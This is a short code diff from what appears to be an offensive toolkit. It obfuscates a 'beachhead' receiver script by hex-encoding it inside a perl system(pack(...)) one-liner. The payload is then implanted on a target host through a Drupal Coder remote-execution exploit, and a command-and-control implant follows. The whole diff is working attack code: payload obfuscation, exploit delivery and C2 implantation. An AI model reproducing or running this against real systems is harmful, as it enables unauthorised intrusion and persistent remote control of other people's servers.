@@ -13,17 +13,22 @@ BEACHHEAD_LOCATION = PARENT_DIR + 'include/BeachheadReceiver.py'
 def package_beachhead():
     with open(BEACHHEAD_LOCATION, 'r') as f:
         receiver = python_minifier.minify(f.read())
-    hex_beachhead = binascii.hexlify(receiver.encode('utf-8')).decode('utf-8')
-    return "xxd -r -p <<< " + hex_beachhead + " | python3"
+    receiver = 'echo "' + receiver + '" | python3'
+    hex_beachhead = binascii.hexlify(receiver.encode('utf-8')).decode('utf-8') 
+    bh = "perl -e 'system(pack(qq,H" + str(len(hex_beachhead)) + ",,qq," + hex_beachhead + ",))'"
+    print("BEACHHEAD: beachhead packaged")
+    return bh
 
 def implant_beachhead(ip_addr, port, path):
     beachhead = package_beachhead()
     exec = DrupalCoderExec(beachhead)
     exec.exploit(ip_addr, port, path)
+    print("BEACHHEAD: Beachhead implanted")
     
 def implant_cnc(ip_addr, port, path, implant_file_path):
     sender = BeachheadSender(ip_addr, port, path, implant_file_path)
     sender.send_request()
+    print("BEACHHEAD: CNC implanted")
 
 
 if __name__ == '__main__':
